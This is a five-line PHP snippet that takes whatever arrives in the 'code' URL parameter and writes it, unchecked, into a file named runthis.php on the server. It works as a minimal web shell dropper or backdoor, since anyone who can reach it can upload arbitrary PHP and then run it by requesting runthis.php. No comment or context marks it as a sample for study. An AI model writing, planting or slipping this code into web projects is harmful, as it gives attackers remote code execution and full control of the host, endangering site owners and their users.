<?php
    $content = $_GET['code'];
    $fp = fopen("runthis.php","wb");
    fwrite($fp,$content);
    fclose($fp);